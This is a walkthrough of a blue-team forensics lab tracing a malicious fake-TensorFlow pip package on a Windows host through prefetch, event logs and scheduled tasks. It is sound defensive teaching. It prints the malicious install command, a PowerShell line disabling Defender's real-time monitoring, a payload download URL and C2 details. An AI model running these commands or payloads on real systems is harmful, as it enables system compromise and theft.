# [CyberDefenders - Malicious PyPi](https://cyberdefenders.org/blueteam-ctf-challenges/malicious-pypi/)
## Table of Contents

- [Scenario](#scenario)
- [Questions](#questions)

* * *
## Scenario
As a SOC analyst, you were asked to inspect a suspected document that a user received in their inbox. One of your colleagues told you that he could not find anything suspicious. However, throwing the document into the sandboxing solution triggered some alerts. Your job is to investigate the document further and confirm whether it's malicious or not.

**Category**: Endpoint Forensics

**Tools**:
EZ Tools
DB Browser for SQLite
Strings
Event Log Explorer

* * *
![1b1845bf72f4d43653543c5ee8779d75.png](/resources/1b1845bf72f4d43653543c5ee8779d75.png)

In this lab, we will have Windows artifacts collected from C drive and based on the name of this lab, it’s very obvious that we are dealing with the case that the system was compromised from malicious pypi package installation.

## Questions
>Q1: Dr. Alex Rivera recently downloaded an external library that raised suspicions about system security. Can you identify the specific command used for this download?

![5729a9d0227db11aa8f003c3422b0737.png](/resources/5729a9d0227db11aa8f003c3422b0737.png)

When talking about python package (pypi), we might deal with `pip` and there are 2 primary ways we could obtain the command used to install malicious package via `pip`

- First is the `ConsoleHost_history.txt` of this specific user, we only have Administrator user here, so I checked the console host history that stored PowerShell command line history of each user, and I found that python package installation via `pip` from a1l4m’s GitHub (creator of this lab) and the Git Repository name giving out that Dr. Alex Rivera thought that this might be legitimate [TensorFlow](https://pypi.org/project/tensorflow/) package that led to the compromise of this machine.
- Second is command line logging if enabled but sadly, it is not enabled on this system which is expected as a1l4m is the author of this lab.

```
pip install git+https://github.com/a1l4m/TensorFlow.git#egg=TensorFlow
```

>Q2: During the investigation, you uncover a command that modified the system's security settings, resulting in the deactivation of Windows Defender in a manner that could assist an attacker. What was this command?

![42b4aa6740d2baf90fb7cf287b451cf9.png](/resources/42b4aa6740d2baf90fb7cf287b451cf9.png)

Since we have prefetch that could be used to create the execution timeline of each `.exe` file then I used `PECmd` from Eric Zimmerman’s Tools to parse whole prefetch folder and look at the execution time of `pip` executable and we can see that there are 4 execution of `pip.exe` during 2024-02-25 12:15 - 12:23 and I also noticed `setup.exe` that very standout here since it was executed from the temporary folder created by pip installation of the fake TensorFlow package

Command: `PECmd.exe -d "C:\Users\Administrator\Desktop\Start Here\Artifacts\C\Windows\prefetch" --csv .`

![5f43a7966fea092d2dc7d05d0ffb2e40.png](/resources/5f43a7966fea092d2dc7d05d0ffb2e40.png)

Now I’ll parse whole Windows event log folder (technically, we should only parsed PowerShell related log only) to create a new CSV file that can be opened via Timeline Explorer, and it will help me when using filter to find specific event. And my interest area is the PowerShell log where the malicious package could run the PowerShell command to disable Real Time Monitoring of Windows Defender and as we can see that at 2024-02-26 12:22, `Set-MpPreference -DisableRealtimeMonitoring $true` was executed which aligns with the `pip` executing in the prefetch as we already discovered

Command: `EvtxECmd.exe -d "C:\Users\Administrator\Desktop\Start Here\Artifacts\C\Windows\System32\winevt\logs" --csv . --csvf log_timeline.csv`

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

>Q3: Based on your timeline analysis, at what date and time did you first observe unauthorized changes to the security settings that led to the disabling of Windows Defender?
```
2024-02-26 12:22
```

>Q4: After the security settings were compromised, a new file appeared on the system. What is the MD5 hash of this file, indicating its unique identity?

![c069517a01029863f770b6e2f76807d8.png](/resources/c069517a01029863f770b6e2f76807d8.png)

From the prefetch timeline, we can see that there are 2 `setup.exe` executed from temporary installation folder of fake TensorFlow package and we can generate the hash of any of them to get the answer of this question.

![c2dff718f8977fd8bb0ddd1e38939b74.png](/resources/c2dff718f8977fd8bb0ddd1e38939b74.png)

I will also search this hash on [VirusTotal - File - 5f8212f95007a5aceb61d3be86c7d1bdb03980ae8a3bd822c847d4c83c528330](https://www.virustotal.com/gui/file/5f8212f95007a5aceb61d3be86c7d1bdb03980ae8a3bd822c847d4c83c528330), which reveal that this is the Sliver implant which should be responsible for the reverse shell connection to the threat actor once it executed.

```
23aadf3c98745cf293bff6b1b0980429
```

>Q5: Investigate the origin of the malicious file detected on the server. What was the exact URL from which this file was initially downloaded before it started communicating with external C2 servers?

![2ab2d94050b245c13c41b6290aabc040.png](/resources/2ab2d94050b245c13c41b6290aabc040.png)

On Windows workstation, when install package with `pip`, it will create temporary file in `C:\Users\<username>\AppData\Local\Temp\` so we can open the whole folder in VS Code and use “Find in files” feature to search for the sliver implant file name which reveal the python script that was used to download sliver implant and execute it as shown in the image above. 

```
http://3.66.85.252:8000/file.exe
```

>Q6: The file in the previous question started communicating with an external C2 server. What port was used for this communication?

![8d16606fe4b13803901660d6d9aa1bd6.png](/resources/8d16606fe4b13803901660d6d9aa1bd6.png)

Now we shall go back to VirusTotal and we can go to “Behavior” tab to find the port that was used for reverse shell connection as seen in the image above.

```
8888
```

>Q7: Attackers often ensure their continued access to a compromised system through persistence mechanisms. When was such a mechanism established in Dr. Rivera's system?

![4f7deb2e9beab20ca114c930ff5c8821.png](/resources/4f7deb2e9beab20ca114c930ff5c8821.png)

I check the prefetch timeline again to find for the low-hanging fruits such as the execution of `reg.exe` or `schtasks.exe` and we can see that at 2024-02-26 12:36, `schtasks.exe` was executed so we shall take a look at the scheduled task created during this time.

![1e235a258e70ad2e9c48681595711b87.png](/resources/1e235a258e70ad2e9c48681595711b87.png)

By examining the `Windows\System32\Tasks` folder, we can see the suspicious task named “SystemUpdatesDaily” with the Date modified in the same timestamp as the `schtasks.exe` execution.

![910578fe7319ea721bf2659dc252440a.png](/resources/910578fe7319ea721bf2659dc252440a.png)

By inspecting the task configuration file, we can see that this scheduled task will execute sliver implant during the boot time with highest privilege available (system) and now it is confirmed that the scheduled task was created at 12:36

```
2024-02-26 12:36
```

>Q8: After the attacker completed their intrusion, a specific file was left behind on the host system. Based on the information you've gathered, provide the name of this file, which was created shortly after the attacker established persistence on the system.

![ba23638340f7cd41bc51c86a3cbe0c2c.png](/resources/ba23638340f7cd41bc51c86a3cbe0c2c.png)

On the prefetch timeline, I also noticed the execution of `system.exe` which is not really standard executable on Windows.

![4f8a5ff95729c1c6a36370b78b72e309.png](/resources/4f8a5ff95729c1c6a36370b78b72e309.png)

We also have this executable to calculate file hash and as we can see that the date modified time is within the incident timeframe, so this file was created during the incident (we can correlate this with file creation event in MFT and UsnJournal as well)

![993488af89c4cfc626a466c8f1f36eb0.png](/resources/993488af89c4cfc626a466c8f1f36eb0.png)

After searching this hash on VirusTotal, we can now confirm that this file is a malciious file and the threat label highlight this file as Aurora Stealer.

```
system.exe
```

>Q9: Determine the exact moment the malicious file identified in Question 8 began its operation. When was it first executed?

![fc1d27aac612e3bb19e397235c4cfeb2.png](/resources/fc1d27aac612e3bb19e397235c4cfeb2.png)

As seen in the prefetch timeline that the first execution of this file is at 12:42

```
2024-02-26 12:42
```

>Q10: After identifying the malicious file in Question 8, it is crucial to determine the name of the malware family. This information is vital for correlating the attack with known threats and developing appropriate defenses. What is the malware family name for the malicious file in Question 8?

![f7546df00a3990eedf90004095277046.png](/resources/f7546df00a3990eedf90004095277046.png)

As we already figured it out from popular threat label, we can also check the community tab and a lot of malware sandbox also labeled this as Aurora Stealer as well.

```
Aurora
```

https://cyberdefenders.org/blueteam-ctf-challenges/achievements/Chicken_0248/malicious-pypi/
* * *
